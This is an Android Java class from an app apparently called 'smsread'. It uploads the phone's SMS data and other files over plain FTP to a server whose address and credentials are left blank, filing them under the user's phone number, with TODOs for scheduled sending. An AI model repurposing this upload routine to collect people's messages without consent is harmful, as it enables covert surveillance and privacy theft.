package com.example.smsread;

import android.os.AsyncTask;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPFile;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetAddress;

public class SendFiles extends AsyncTask<File, Integer, Boolean> {

    //TODO create secure connection
    //TODO check for same files and add new name if the file is different
    //TODO set interval when to send files

    private static final String SERVER_NAME = "";
    private static final int port = 21;
    private static final String USERNAME = "";
    private static final String PASSWORD = "";

    FTPClient ftpClient = null;

   /* public static void SendData(String absoluteFilePath) throws IOException {
        Socket socket = new Socket("Ante",PORT);

        File fileToSend = new File(absoluteFilePath);

        byte[] byteFileData = new byte[(int)fileToSend.length()];
        FileInputStream fis = new FileInputStream(fileToSend);
        BufferedInputStream bis = new BufferedInputStream(fis);

        bis.read(byteFileData,0, byteFileData.length);

        OutputStream os = socket.getOutputStream();
        os.write(byteFileData,0 ,byteFileData.length);

        os.flush();
        socket.close();
    }*/


    @Override
    protected Boolean doInBackground(File... args) {

        ftpClient = new FTPClient();
        try {
            ftpClient.connect(InetAddress.getByName(SERVER_NAME), port);

            if (!ftpClient.login(USERNAME, PASSWORD))
                return null;

            ftpClient.enterLocalPassiveMode();

            //create new directory and place all files there
            createNewDirectoryOnServer(GLOBAL.GET_USER_PHONE_NUMBER);

            ftpClient.setFileType(FTP.BINARY_FILE_TYPE);

            //sends files and sms file to server
            sendDataToServer(GLOBAL.GET_USER_PHONE_NUMBER + ".txt", MainActivity.SMS_DATA);
            sendFilesToServer(args);

        } catch (IOException ex) {
            ex.getMessage();
        } finally {
            try {
                if (ftpClient.isConnected()) {
                    ftpClient.logout();
                    ftpClient.disconnect();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }

        }
        return null;
    }

    private boolean createNewDirectoryOnServer(String directoryName) {
        try {
            if (containsDirectory(directoryName)) {
                ftpClient.changeWorkingDirectory(directoryName);
                return false;
            }

            ftpClient.makeDirectory(directoryName);
            ftpClient.changeWorkingDirectory(directoryName);
            return true;
        } catch (IOException ex) {
            ex.printStackTrace();
            try {//in case of an error with creating a directory (invalid characters etc) everything goes in the same directory
                String defaultDirectory = "UNKNOWN";
                ftpClient.makeDirectory(defaultDirectory);
                ftpClient.changeWorkingDirectory(defaultDirectory);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return false;
    }

    private boolean sendFilesToServer(File... files) {
        try {
            for (File file : files) {
                InputStream inputStream = new FileInputStream(file);
                ftpClient.storeFile(file.getName(), inputStream);
                inputStream.close();
            }
            return true;
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        return false;
    }

    private boolean sendDataToServer(String fileName, String dataToSend) {
        File file = GLOBAL.WriteToTextFile(fileName, dataToSend);

        try {
            InputStream inputStream = new FileInputStream(file);
            ftpClient.storeFile(file.getName(), inputStream);
            inputStream.close();
            return true;
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }

    private boolean containsDirectory(String directoryName) {
        try {
            for (FTPFile directory : ftpClient.listDirectories()) {
                if (directory.getName().equals(directoryName)) {
                    return true;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }
}
